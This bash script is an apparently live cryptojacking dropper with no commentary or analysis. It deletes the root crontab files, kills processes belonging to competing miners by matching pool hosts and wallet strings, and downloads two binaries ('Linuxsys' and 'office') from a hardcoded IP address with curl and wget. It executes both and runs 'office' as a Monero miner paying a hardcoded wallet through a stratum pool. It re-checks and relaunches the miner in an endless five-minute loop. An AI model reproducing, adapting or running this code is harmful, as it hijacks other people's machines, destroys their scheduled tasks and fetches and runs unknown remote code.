#!/bin/bash
function kills() {
	rm -rf /var/spool/cron/root
	rm -rf /var/spool/cron/crontabs/root
	rm -rf /tmp/*index_bak*
	rm -rf /tmp/*httpd.conf*
	rm -rf /tmp/*httpd.conf
	rm -rf /tmp/a7b104c270
	pkill -9 AnXqV.yam
	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "monerohash.com:3333"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQt989KEfGRt6Ww2Xg8"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
}

function downloadlinuxsys() {	
	if [ ! -f Linuxsys ];then
		pwddd=$( pwd )
		curl http://69.165.65.252/Linuxsys>Linuxsys && chmod +x Linuxsys
		wget http://69.165.65.252/Linuxsys>Linuxsys && chmod +x Linuxsys
		rm -rf Linuxsys.*
		${pwddd}/Linuxsys
	else
		chmod +x ${pwddd}/Linuxsys
		${pwddd}/Linuxsys
	fi
}

function downloadyam() {
	if [ ! -f "office" ];then
		curl http://69.165.65.252/office>office && chmod +x office
		wget http://69.165.65.252/office && chmod +x office
		rm -rf office.*
		./office -c x -M stratum+tcp://42Eo4G4b9CK5bTkDrBkniCb2AQSRHbHVZ6naApPKBshH2PRfxvvfVCr6Pn2pfnrc7A8hXLLKRmqyoUDiAg1cB1GL9eMMoNw:x@get.bi-chi.com:3333/xmr &
	else
		./office -c x -M stratum+tcp://42Eo4G4b9CK5bTkDrBkniCb2AQSRHbHVZ6naApPKBshH2PRfxvvfVCr6Pn2pfnrc7A8hXLLKRmqyoUDiAg1cB1GL9eMMoNw:x@get.bi-chi.com:3333/xmr &
	fi
}

pwddxx=$( pwd )
linuxsysor=$(ps aux | grep Linuxsys | grep -v grep | wc -l)
if [ ${linuxsysor} -eq 0 ];then
	if [ ! -f "Linuxsys" ]; then
		downloadlinuxsys	
	else
		chmod 777 Linuxsys
		${pwddxx}/Linuxsys
	fi
else
	echo "Linuxsys-ing"
fi

pwdd=$( pwd )
while [ 1 ]
do
	kills
	p=$(ps aux | grep office | grep -v grep | wc -l)
	if [ ${p} -eq 1 ];then
		echo "officeing"
	elif [ ${p} -eq 0 ];then
		downloadyam
	else
		echo ""
	fi
	sleep 300
done
